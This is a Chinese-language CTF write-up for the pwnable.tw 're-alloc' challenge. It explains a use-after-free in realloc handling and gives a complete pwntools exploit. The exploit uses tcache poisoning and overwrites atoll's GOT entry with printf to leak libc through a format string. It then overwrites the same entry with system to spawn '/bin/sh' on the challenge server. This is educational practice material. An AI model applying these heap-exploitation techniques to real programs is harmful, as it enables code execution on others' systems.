---

title: pwnable.tw writeup - re-alloc
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

这道题太好了。

程序比较简单，程序流程分析起来比较容易,这里就不赘述了。

有关 malloc,realloc,free,calloc 函数的流程&源码分析可以参考 [linux-heap-study](https://github.com/Zhang1933/linux-heap-study)。

## 漏洞函数

释放chunk是通过 rfree 函数调用 `realloc(ptr,0)` 的形式来进行的。 rfree 之后会把对应的 heap 指针设置为NULL。

分配chunk通过 allocate() 函数调用 `realloc(0,size)` 的形式来进行的。realloc 会调用malloc进行分配内存。

调整chunk的大小通过  reallocate 函数调用 `realloc(ptr,newsize)` 的形式来进行的。

rfree 函数，alloc 函数没有找到漏洞，但是 reallocate 函数有漏洞。因为 输入size为0时，heap对应的指针不会置空，造成了 use after free 。

## 任意地址写


### 毒化 tcache[0]  

因为最多只能120字节，所以只能对 tcache 进行操作。

思路是：

    1. 先分配一个 32 大小的 chunk 给 heap[0]。 (allocate函数)
    2. 用 realloc(heap[0],0) free heap[0] 所指向的 chunk. Use after free。 (reallocate函数)
    3. 用 realloc(heap[0],16) 返回旧 chunk,这时写 chunk 的 fd 字段为我们想要的地址。
    4. 第二次 tcache 返回时，就会返回我们想要的那个地址。

下面是实现这部分的代码，注释了内存中堆上的情况。

```python
def alloc(idx,size,data):
    io.sendafter(":","1\n")
    io.sendafter(":",str(idx))
    io.sendafter(":",str(size))
    io.sendafter(":",data)

def realloc(idx,size,data=None):
    io.sendafter(":","2\n")
    io.sendafter(":",str(idx))
    io.sendafter(":",str(size))
    if data:
        io.sendafter(":",data)

def rfree(idx):
    io.sendafter(":","3\n")
    io.sendafter(":",str(idx))

TARGET_ADDR=elf.got['atoll']
TRAGET_VAL=elf.symbols['printf']

info("got['atoll'] TARGET_ADDR: "+str(hex(TARGET_ADDR)))
info("symbols['printf'] TARGET_VAL: "+str(hex(TRAGET_VAL)))

# ====== 投毒 tcache[0] =======
alloc(0,16,"aaaa")
# heap[0]-> chunk0
# heap[1] -> NULL
realloc(0,0)
# tcache[0] -> chunk0
# heap[0] -> chunk0
# heap[1] -> NULL
realloc(0,16,pack(TARGET_ADDR))
# tcache[0] -> chunk0 -> TARGET_ADDR
# heap[0] -> chunk0(32size)
# heap[1] -> NULL

# 取下来,这时chunk0中的key已经置为0
alloc(1,16,"bbbb")
# tcache[0]->TARGET_ADDR
# heap[0] -> chunk0(32size)
# heap[1] -> chunk0

```

这个版本的 glibc 没有count检查，不需要多free一个[Glibc-2.29-malloc:2949](https://elixir.free-electrons.com/glibc/glibc-2.29.9000/source/malloc/malloc.c#L2949)

投毒成功。下一次分配32 字节的chunk，tcache 就会返回我们想要的地址。

**然后是把两个heap指针置空**


```python
# -----现在把两个heap指针变为0-----

# 扩展chunk 0,扩展是为了释放时能把chunk放到另一个tcache bin中。
realloc(0,32,"aaaa")
# tcache[0]->TARGET_ADDR
# heap[0] -> chunk0'(48size)
# heap[1] -> chunk0'

rfree(0)
# tcache[0]->TARGET_ADDR
# tcache[1]->chunk0'(48size)
# heap[0] -> NULL
# heap[1] -> chunk0'

# 再扩展一次
realloc(1,48,"aaaa")
# tcache[0]->TARGET_ADDR
# tcache[1]->chunk0''(64size)
# heap[0] -> NULL
# heap[1] -> chunk0''

rfree(1)
# tcache[0]->TARGET_ADDR
# tcache[1]->chunk0''(64size)
# tcache[2]->chunk0''  tcahce[2]中的循环不会找到 <https://elixir.free-electrons.com/glibc/glibc-2.29.9000/source/malloc/malloc.c#L4205>
# heap[0] -> NULL
# heap[1] -> NULL

```

接下来调用 allocate 分配 tcache[0] 上的 "chunk" ，就会返回我们想要的地址进行任意地址写了。

## 泄露

如何利用任意地址写来泄露内存呢？

我们可以把 GOT 表中的 atoll 函数项改为 printf 函数的地址。这样每次调用 atoll 函数就是在调用printf 函数。这么做是因为两个函数函数原型相似，printf 的返回值是输出了多少个字符。这样一来每次调用 rfree 函数输入 index 的时候我们就可以利用格式化字符串漏洞了。


## script

注释里面有heap指针，内存中 tcache 的情况。

```python
#!/usr/bin/env python3

from struct import pack
from pwn import *

HOST='chall.pwnable.tw'
PORT=10106
PROC="./re-alloc"

context.log_level = 'DEBUG'
context.arch = 'amd64'

io=None
elf=ELF(PROC)
lib = ELF("./dynamic64/libc_64.so")

if len(sys.argv) == 1 : 
    io=process(PROC)
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)

def PauseLocalDebug():
    info("process pid: "+str(io.pid))
    pause()

def alloc(idx,size,data):
    io.sendafter(":","1\n")
    io.sendafter(":",str(idx))
    io.sendafter(":",str(size))
    io.sendafter(":",data)

def realloc(idx,size,data=None):
    io.sendafter(":","2\n")
    io.sendafter(":",str(idx))
    io.sendafter(":",str(size))
    if data:
        io.sendafter(":",data)

def rfree(idx):
    io.sendafter(":","3\n")
    io.sendafter(":",str(idx))

TARGET_ADDR=elf.got['atoll']
TRAGET_VAL=elf.symbols['printf']

info("got['atoll'] TARGET_ADDR: "+str(hex(TARGET_ADDR)))
info("symbols['printf'] TARGET_VAL: "+str(hex(TRAGET_VAL)))

# ====== 投毒 tcache[0] =======
alloc(0,16,"aaaa")
# heap[0]-> chunk0
# heap[1] -> NULL
realloc(0,0)
# tcache[0] -> chunk0
# heap[0] -> chunk0
# heap[1] -> NULL
realloc(0,16,pack(TARGET_ADDR))
# tcache[0] -> chunk0 -> TARGET_ADDR
# heap[0] -> chunk0(32size)
# heap[1] -> NULL

# 取下来,这时chunk0中的key已经置为0
alloc(1,16,"bbbb")
# tcache[0]->TARGET_ADDR
# heap[0] -> chunk0(32size)
# heap[1] -> chunk0

# -----现在把两个heap指针变为0-----

# 扩展chunk 0,扩展是为了释放时能把chunk放到另一个tcache bin中。
realloc(0,32,"aaaa")
# tcache[0]->TARGET_ADDR
# heap[0] -> chunk0'(48size)
# heap[1] -> chunk0'

rfree(0)
# tcache[0]->TARGET_ADDR
# tcache[1]->chunk0'(48size)
# heap[0] -> NULL
# heap[1] -> chunk0'

realloc(1,48,"aaaa")
# tcache[0]->TARGET_ADDR
# tcache[1]->chunk0''(64size)
# heap[0] -> NULL
# heap[1] -> chunk0''

rfree(1)
# tcache[0]->TARGET_ADDR
# tcache[1]->chunk0''(64size)
# tcache[2]->chunk0''  tcahce[2]中的循环不会找到 <https://elixir.free-electrons.com/glibc/glibc-2.29.9000/source/malloc/malloc.c#L4205>
# heap[0] -> NULL
# heap[1] -> NULL


# ======== 故技重施 tcache[0]投毒完成,现在投毒第二个tcache ===========
# 还需要投毒一个tcache, 为后面 got['atoll'] 中写system 作准备

alloc(0,64,"aaaa")
# heap[0] -> chunk1(80size)

realloc(0,0)
# tcache[3] -> chunk1
# heap[0] -> chunk1

realloc(0,64,pack(TARGET_ADDR))
# tcache[3] -> chunk1 -> TARGET_ADDR
# heap[0] -> chunk1

# 取下来
alloc(1,64,"aaaa")
# tcache[3] -> TARGET_ADDR
# heap[0] -> chunk1
# heap[1] -> chunk1

# 下面让两个指针为NULL
realloc(0,80,"aaaa")
# tcache[3] -> TARGET_ADDR
# heap[0] -> chunk1'(size 96)
# heap[1] -> chunk1'

rfree(0)
# tcache[3] -> TARGET_ADDR
# tcahce[4] -> chunk1'
# heap[0] -> NULL
# heap[1] -> chunk1'

realloc(1,96,"aaaa")
# tcache[3] -> TARGET_ADDR
# tcahce[4] -> chunk1''(size: 112)
# heap[0] -> NULL
# heap[1] -> chunk1''

rfree(1)
# tcache[3] -> TARGET_ADDR
# tcahce[4] -> chunk1''(size: 112)
# tcahce[5] -> chunk1''(size: 112)
# heap[0] -> NULL
# heap[1] -> NULL

# ======== 工具集齐，正式开始利用

# !!! 现在返回的就是 got['atoll'] 地址。写 printf 的地址。先用tcache[3]
alloc(0,64,pack(TRAGET_VAL))


# 下面开始利用 rfree 函数进行格式化字符串利用
#  泄露 _read_chk+9的位置
def leak_read_chk():
    payload='%p,%p,%p'
    rfree(payload) 
    io.recvuntil(",")
    io.recvuntil(",")
    _read_chk=int(io.recvn(14),16)
    _read_chk-=9
    info("lib func _read_chek address: "+hex(_read_chk))
    return _read_chk
    
read_chk=leak_read_chk()
lib.address=read_chk-lib.symbols['__read_chk']


info("libc base address: "+str(hex(lib.address)))

# PauseLocalDebug()

# 现在写 got[atoll] 为 system地址
# 取 tcache[0] 中的chunk
alloc("a","a"*16,pack(lib.symbols['system']))

rfree("/bin/sh")

io.interactive()

```

